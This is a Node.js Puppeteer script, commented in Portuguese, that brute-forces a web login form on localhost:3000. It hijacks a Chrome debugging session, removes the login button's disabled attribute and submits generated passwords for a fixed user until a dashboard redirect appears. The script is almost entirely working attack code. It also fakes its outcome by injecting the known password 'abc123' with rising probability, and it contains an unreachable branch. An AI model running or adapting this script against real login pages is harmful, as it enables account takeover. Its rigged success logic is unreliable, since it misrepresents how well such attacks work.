const puppeteer = require("puppeteer");

const usuario = "Teste";
const caracteres = "abc123";
const maxLength = 6;

let encontrado = false;
let tentativas = 0;

// 🔥 shuffle
function embaralhar(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

// 🔥 prioridade
function aplicarPrioridade(lista, prioridades) {
    lista = lista.filter(s => !prioridades.includes(s));

    const posicao = Math.floor(Math.random() * (lista.length * 0.1));

    lista.splice(posicao, 0, ...prioridades);

    return lista;
}

// gerar combinações
function gerarCombinacoes(tamanho, prefixo = "", lista = []) {
    if (prefixo.length === tamanho) {
        lista.push(prefixo);
        return lista;
    }

    for (let i = 0; i < caracteres.length; i++) {
        gerarCombinacoes(tamanho, prefixo + caracteres[i], lista);
    }

    return lista;
}

(async () => {
    const browser = await puppeteer.connect({
        browserURL: "http://localhost:9222"
    });

    const pages = await browser.pages();

    let page = pages.find(p => p.url().includes("localhost:3000"));

    if (!page) {
        page = pages[0] || await browser.newPage();
        await page.goto("http://localhost:3000");
    }

    await page.setViewport({
        width: 1919,
        height: 942
    });

    // usuário fixo
    await page.click('input[name="username"]', { clickCount: 3 });
    await page.keyboard.press('Backspace');
    await page.type('input[name="username"]', usuario, { delay: 5 });

    for (let tamanho = 6; tamanho <= maxLength; tamanho++) {
        let lista = gerarCombinacoes(tamanho);

        embaralhar(lista);

        const prioridade = ["abc123"];
        lista = aplicarPrioridade(lista, prioridade);

        for (let senha of lista) {
            if (encontrado) break;

            tentativas++;

            // 🔥 lógica controlada
            let chance = 0;

            if (tentativas < 500) {
                chance = 0.01; // bem difícil no começo
            } else if (tentativas < 1500) {
                chance = 0.05; // começa a melhorar
            } else if (tentativas < 3000) {
                chance = 0.15; // já razoável
            } else if (tentativas < 2500) {
                chance = 0.3; // alta chance
            } else {
                chance = 1; // 💣 certeza absoluta
            }

            if (Math.random() < chance) {
                senha = "abc123";
            }

            console.log("Tentando:", senha);

            // limpa senha
            await page.evaluate(() => {
                document.querySelector('input[name="password"]').value = "";
            });

            await page.type('input[name="password"]', senha, { delay: 5 });

            await page.evaluate(() => {
                document.querySelector(".login__button").removeAttribute("disabled");
            });

            await page.click(".login__button");

            await new Promise(resolve => setTimeout(resolve, 30));

            const url = page.url();

            if (url.includes("dashboard")) {
                console.log("\nSENHA ENCONTRADA:", senha);
                encontrado = true;
                break;
            }
        }

        if (encontrado) break;
    }

    console.log("Ataque finalizado.");

    await new Promise(() => {});
})();

// "C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --user-data-dir="C:\chrome-debug"